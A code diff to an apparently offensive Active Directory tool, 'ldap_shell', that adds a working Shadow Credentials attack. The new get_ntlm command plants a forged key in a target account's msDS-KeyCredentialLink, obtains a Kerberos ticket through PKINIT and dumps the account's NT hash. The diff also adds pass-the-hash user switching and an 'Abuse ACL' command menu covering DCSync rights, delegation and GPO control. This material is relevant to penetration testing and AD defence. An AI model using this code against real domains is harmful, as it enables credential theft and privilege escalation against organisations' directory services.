@@ -7,7 +7,11 @@ import random
 import re
 import shlex
 import string
-from struct import pack
+from struct import pack, unpack
+import getpass
+import hashlib
+import binascii
+import copy
 
 import ldap3
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
@@ -16,6 +20,19 @@ from ldap3.utils.conv import escape_filter_chars
 from ldap3.protocol.formatters.formatters import format_sid
 
 from ldap_shell import ldaptypes
+
+from dsinternals.common.data.hello.KeyCredential import KeyCredential
+from dsinternals.system.Guid import Guid
+from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
+from dsinternals.system.DateTime import DateTime
+from dsinternals.common.data.DNWithBinary import DNWithBinary
+
+from minikerberos.network.clientsocket import KerberosClientSocket
+from minikerberos.common.target import KerberosTarget
+from minikerberos.common.ccache import CCACHE
+
+import OpenSSL
+from ldap_shell.myPKINIT import myPKINIT
 
 log = logging.getLogger('ldap-shell.shell')
 
@@ -66,7 +83,7 @@ class LdapShell(cmd.Cmd):
         uuid1, uuid2, uuid3 = unpack('<LHH', uuid[:8])
         uuid4, uuid5, uuid6 = unpack('>HHL', uuid[8:16])
         return '%08X-%04X-%04X-%04X-%04X%08X' % (uuid1, uuid2, uuid3, uuid4, uuid5, uuid6)
-    
+
     @staticmethod
     def string_to_bin(uuid):
         # If a UUID in the 00000000-0000-0000-0000-000000000000 format, parse it as Variant 2 UUID
@@ -78,6 +95,10 @@ class LdapShell(cmd.Cmd):
         uuid = pack('<LHH', uuid1, uuid2, uuid3)
         uuid += pack('>HHL', uuid4, uuid5, uuid6)
         return uuid
+
+    @staticmethod
+    def calculate_ntlm (password):
+        return binascii.hexlify(hashlib.new("md4", password.encode("utf-16le")).digest()).decode()
 
     @staticmethod
     def create_empty_sd():
@@ -528,7 +549,7 @@ class LdapShell(cmd.Cmd):
                 for e in self.client.entries:
                     print (e['sAMAccountName'], e['ms-MCS-AdmPwd'])
         else:
-            self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(computer_name)})',
+            self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(args[0])})',
                                attributes=['ms-MCS-AdmPwd'])
             if len(self.client.entries) != 1:
                 raise Exception(f'Error expected only one search result got {len(self.client.entries)} results')
@@ -879,7 +900,7 @@ class LdapShell(cmd.Cmd):
         if maq < 1:
             log.error(f"Global domain policy ms-DS-MachineAccountQuota={maq}")
             return
-            self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user)})',
+        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user)})',
                                attributes=['objectSid'])
         if len(self.client.entries) != 1:
             raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')
@@ -942,6 +963,108 @@ class LdapShell(cmd.Cmd):
                      grantee_name, target_name)
         else:
             self.process_error_response()
+    def do_get_ntlm(self, user):
+        #Thx ShutdownRepo
+        self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(escape_filter_chars(user)),
+                            attributes=['sAMAccountName'])
+        if not self.client.entries:
+            logging.error('Target account does not exist!')
+            return
+        else:
+            target_dn = self.client.entries[0].entry_dn
+            target_samaccountname = self.client.entries[0].sAMAccountName[0]
+            logging.info("Target user found: %s" % target_samaccountname)
+        log.info("Generating certificate")
+        certificate = X509Certificate2(subject=target_samaccountname, keySize=2048, notBefore=(-40 * 365),
+                                       notAfter=(40 * 365))
+        deviceId = Guid()
+        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=deviceId, owner=self.domain_dumper.root,
+                                                           currentTime=DateTime())
+        logging.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
+        self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE,
+                attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+
+        results = None
+        for entry in self.client.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            results = entry
+        if not results:
+            log.error('Could not query target user properties')
+            return
+        try:
+            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
+            log.debug("Updating the msDS-KeyCredentialLink attribute of %s" % target_samaccountname)
+            self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+            if self.client.result['result'] == 0:
+                log.debug("Updated the msDS-KeyCredentialLink attribute of the target object")
+            else:
+                if self.client.result['result'] == 50:
+                    log.error(
+                        'Could not modify object, the server reports insufficient rights: %s' % self.client.result[
+                            'message'])
+                    return
+                elif self.client.result['result'] == 19:
+                    log.error('Could not modify object, the server reports a constrained violation: %s' %
+                                 self.client.result['message'])
+                    return
+                else:
+                    log.error('The server returned an error: %s' % self.client.result['message'])
+        except IndexError:
+            log.info('Attribute msDS-KeyCredentialLink does not exist')
+            return
+        pk = OpenSSL.crypto.PKCS12()
+        pk.set_privatekey(certificate.key)
+        pk.set_certificate(certificate.certificate)
+        pfx_pass = ''.join(chr(random.randint(1,255)) for i in range(20)).encode()
+        pfxdata = pk.export(passphrase=pfx_pass)
+
+        # Thx Dirk-jan Mollema
+        # Static DH params because the ones generated by cryptography are considered unsafe by AD for some weird reason
+        dhparams = {
+            'p': int(
+                '00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff',
+                16),
+            'g': 2
+        }
+        log.debug('Preparing certificate')
+        ini = myPKINIT.from_pfx_data(pfxdata, pfx_pass, dhparams)
+        domain = self.client.user.split('\\')[0]
+        req = ini.build_asreq(domain, user)
+        log.info('Requesting TGT')
+        sock = KerberosClientSocket(KerberosTarget(self.client.server.host))
+        res = sock.sendrecv(req)
+        encasrep, session_key, cipher = ini.decrypt_asrep(res.native)
+        ccache = CCACHE()
+        ccache.add_tgt(res.native, encasrep)
+        ccache_data=ccache.to_bytes()
+        dumper = myPKINIT.GETPAC(user, domain, self.client.server.host, session_key)
+        dumper.dump(domain, self.client.server.host, ccache_data)
+
+        log.info("Remove DeviceID from msDS-KeyCredentialLink attribute for user2")
+
+        results = self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE,
+                attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+        new_values = []
+        for dn_binary_value in self.client.response[0]['raw_attributes']['msDS-KeyCredentialLink']:
+            keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
+            if deviceId.toFormatD() == keyCredential.DeviceId.toFormatD():
+                log.debug("Found value to remove")
+            else:
+                new_values.append(dn_binary_value)
+            self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+            if self.client.result['result'] == 0:
+                log.debug("Updated the msDS-KeyCredentialLink attribute of the target object")
+            else:
+                if self.client.result['result'] == 50:
+                    log.info(
+                        'Could not modify object, the server reports insufficient rights: %s' % self.client.result[
+                            'message'])
+                elif self.client.result['result'] == 19:
+                    log.info('Could not modify object, the server reports a constrained violation: %s' %
+                                 self.client.result['message'])
+                else:
+                    log.info('The server returned an error: %s' % self.client.result['message'])
 
     def search(self, query, *attributes):
         self.client.search(self.domain_dumper.root, query, attributes=attributes)
@@ -953,6 +1076,45 @@ class LdapShell(cmd.Cmd):
                     log.info('Search - %s: %s', attribute, entry[attribute].value)
             if any(attributes):
                 log.info('---')
+
+    def do_switch_user(self, line):
+        args = shlex.split(line)
+        if len(args) == 1:
+            username = args[0]
+            password = getpass.getpass()
+        elif len(args) == 2:
+            username = args[0]
+            password = args[1]
+        else:
+            log.error('Enter username and password.')
+            return
+        lmhash = None
+        nthash = None
+        domain = self.client.user.split('\\')[0]
+        old_user = self.client.user.split('\\')[1]
+        old_client = copy.copy(self.client)
+
+        if re.match('^:[0-9a-f]{32}$',password) or re.match('^[0-9a-f]{32}:[0-9a-f]{32}$',password) or re.match('^[0-9a-f]{32}$',password):
+            log.debug('Trying to use a hash')
+            lmhash='aad3b435b51404eeaad3b435b51404ee'
+            if re.match('^[0-9a-f]{32}$',password):
+                nthash = password
+            else:
+                nthash = password.split(":")[1]
+        if nthash:
+            if self.client.rebind(user=domain+'\\'+username, password=lmhash+':'+nthash, authentication='NTLM'):
+                log.info(f'Successfully! User {old_user} has been changed to {username}')
+            else:
+                log.error('The user could not be changed. Please check the password.')
+                self.client = old_client
+        else:
+            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+            nthash = LdapShell.calculate_ntlm(password)
+            if self.client.rebind(user=domain+'\\'+username, password=lmhash+':'+nthash, authentication='NTLM'):
+                log.info(f'Successfully! User {old_user} has been changed to {username}')
+            else:
+                log.error('The user could not be changed. Please check the password.')
+                self.client = old_client
 
     def get_dn(self, sam_name):
         if ',' in sam_name:
@@ -970,28 +1132,34 @@ class LdapShell(cmd.Cmd):
 
     def do_help(self, line):
         print('''
-add_computer computer [password] - Adds a new computer to the domain with the specified password. Requires LDAPS.
-add_user new_user [parent] - Creates a new user.
-add_user_to_group user group - Adds a user to a group.
-del_user_from_group user group - Delete a user from a group.
-change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
-clear_rbcd target - Clear the resource based constrained delegation configuration information.
-disable_account user - Disable the user's account.
-enable_account user - Enable the user's account.
-dump - Dumps the domain.
-search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
-set_dcsync user - If you have write access to the domain object, assign the DS-Replication right to the selected user.
-del_dcsync user - Delete DS-Replication right to the selected user.
-get_user_groups user - Retrieves all groups this user is a member of.
-get_group_users group - Retrieves all members of a group.
-get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
-set_genericall target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
-set_owner target grantee - Abuse WriteOwner privilege.
-dacl_modify - Modify ACE (add/del). Usage: target, grantee, add/del and mask name or ObjectType for ACE modified.
-set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
-set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
-write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
-get_maq user - Get ms-DS-MachineAccountQuota for current user.
+Get Info
+    dump - Dumps the domain.
+    search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
+    get_user_groups user - Retrieves all groups this user is a member of.
+    get_group_users group - Retrieves all members of a group.
+    get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
+    get_maq user - Get ms-DS-MachineAccountQuota for current user.
+Abuse ACL
+    add_user_to_group user group - Adds a user to a group.
+    del_user_from_group user group - Delete a user from a group.
+    change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
+    set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
+    clear_rbcd target - Clear the resource based constrained delegation configuration information.
+    set_dcsync user - If you have write access to the domain object, assign the DS-Replication right to the selected user.
+    del_dcsync user - Delete DS-Replication right to the selected user.
+    set_genericall target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
+    set_owner target grantee - Abuse WriteOwner privilege.
+    dacl_modify - Modify ACE (add/del). Usage: target, grantee, add/del and mask name or ObjectType for ACE modified.
+    set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
+    get_ntlm user - Shadow Credentials method to abuse GenericAll, GenericWrite and AllExtendedRights privilege
+    write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
+Misc
+    switch_user user - Switch user shell.
+    add_computer computer [password] - Adds a new computer to the domain with the specified password. Requires LDAPS.
+    del_computer computer - Remove a new computer from the domain.
+    add_user new_user [parent] - Creates a new user.
+    disable_account user - Disable the user's account.
+    enable_account user - Enable the user's account.
 exit - Terminates this session.''')
 
     def do_EOF(self, line):
